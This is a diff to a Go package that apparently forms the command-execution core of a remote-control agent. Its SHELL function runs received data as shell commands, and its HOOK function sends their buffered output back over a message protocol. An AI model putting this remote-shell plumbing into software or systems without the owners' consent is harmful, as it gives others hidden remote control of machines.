@@ -1,8 +1,8 @@
 package core
 
 import (
+	"bytes"
 	"fmt"
-	"io"
 	"net"
 	"os"
 	"os/exec"
@@ -34,17 +34,19 @@ var (
 )
 
 func SHELL(Data []byte) {
+	var Buf bytes.Buffer
 	Path := "/bin/sh"
 	Args := []string{"-c", string(Data)}
 	if runtime.GOOS == "windows" {
 		Path = os.Getenv("COMSPEC")
-		Args = []string{"/C", string(Data)}
+		Args = []string{"/c", string(Data)}
 	}
 	CMD := exec.Command(Path, Args...)
-	Stdout, _ := CMD.StdoutPipe()
+	CMD.Stdout = &Buf
 	CMD.Stderr = CMD.Stdout
 	if err := CMD.Start(); err == nil {
-		_PIPE_.Store(CMD, Stdout)
+		go CMD.Wait()
+		_PIPE_.Store(CMD, &Buf)
 	}
 }
 
@@ -179,10 +181,14 @@ func ERROR(err error) {
 
 func HOOK(Key, Value interface{}) bool {
 	if PID, OK := Key.(*exec.Cmd); OK {
-		Buf := make([]byte, 4096)
-		Num, err := Value.(io.ReadCloser).Read(Buf)
-		if err != nil { PID.Wait(); _PIPE_.Delete(PID) }
-		if Num > 0 { MakeBytes(30, Buf[:Num]) }
+		Buf := Value.(*bytes.Buffer)
+		if Buf.Len() > 0 {
+			MakeBytes(30, Buf.Next(4096))
+		} else {
+			if PID.ProcessState != nil {
+				_PIPE_.Delete(PID)
+			}
+		}
 	}
 	if FID, OK := Key.(int); OK {
 		Buf := make([]byte, 262144)
@@ -194,7 +200,7 @@ func HOOK(Key, Value interface{}) bool {
 		}
 	}
 	if BID, OK := Key.(string); OK {
-		_PIPE_.LoadAndDelete(BID)
+		_PIPE_.Delete(BID)
 		MakeBytes(10, LittleToBig([]byte(BID)), IntToByte(4, 1114112), Value.([]byte))
 	}
 	return true
